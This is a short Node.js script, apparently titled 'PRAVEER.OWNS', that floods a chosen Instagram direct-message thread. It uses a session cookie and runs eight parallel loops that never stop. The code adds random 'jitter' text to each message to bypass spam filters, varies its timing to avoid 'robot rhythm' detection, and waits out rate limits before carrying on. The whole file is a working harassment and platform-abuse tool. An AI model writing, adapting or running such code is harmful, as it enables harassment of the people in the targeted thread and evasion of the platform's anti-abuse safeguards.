/**
 * 🚀 PROJECT: PRAVEER.OWNS (V109-S SECURE-TITAN)
 * 📅 STATUS: API-STRIKE | PAYLOAD-JITTER | SESSION-SHIELD
 */

const axios = require('axios');

// --- ⚡ SECURE CONFIG ---
const COOKIE = process.env.INSTA_COOKIE;
const THREAD_ID = process.env.TARGET_THREAD_ID;
const MESSAGE_BODY = process.env.MESSAGES;
const BASE_DELAY = 45; // 🛡️ Slightly slower (45ms) for sustained safety

async function sendStrike(agentId) {
    console.log(`🛡️ Agent ${agentId} Secure-Mode Active.`);
    
    const csrftoken = COOKIE.match(/csrftoken=([^;]+)/)?.[1];

    const config = {
        method: 'post',
        url: `https://www.instagram.com/api/v1/direct_messages/threads/${THREAD_ID}/send_item/`,
        headers: {
            'cookie': COOKIE,
            'x-csrftoken': csrftoken,
            'user-agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 17_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Mobile/15E148 Safari/604.1',
            'content-type': 'application/x-www-form-urlencoded',
            'x-requested-with': 'XMLHttpRequest',
            'referer': `https://www.instagram.com/direct/t/${THREAD_ID}/`
        }
    };

    while (true) {
        try {
            // 🎲 PAYLOAD JITTER: Adds a unique invisible salt to bypass filters
            const salt = Math.random().toString(36).substring(2, 8);
            const data = `text=${encodeURIComponent(MESSAGE_BODY + " " + salt)}&client_context=${Date.now()}`;
            
            await axios({ ...config, data });
            process.stdout.write(`💓 [Agent ${agentId}] Secure Hit\r`);
            
        } catch (error) {
            if (error.response?.status === 429) {
                const wait = 3000 + Math.random() * 2000;
                console.log(`\n⚠️ [Agent ${agentId}] Cool-off: ${Math.round(wait)}ms`);
                await new Promise(r => setTimeout(r, wait));
            } else if (error.response?.status === 401) {
                console.log(`\n❌ [Agent ${agentId}] Session Invalid.`);
                process.exit(1);
            }
        }
        // 🕒 RANDOMIZED DELAY: Prevents "Robot Rhythm" detection
        const jitter = Math.floor(Math.random() * 20);
        await new Promise(r => setTimeout(r, BASE_DELAY + jitter));
    }
}

// Start 8 parallel secure streams
for (let i = 1; i <= 8; i++) {
    sendStrike(i);
}
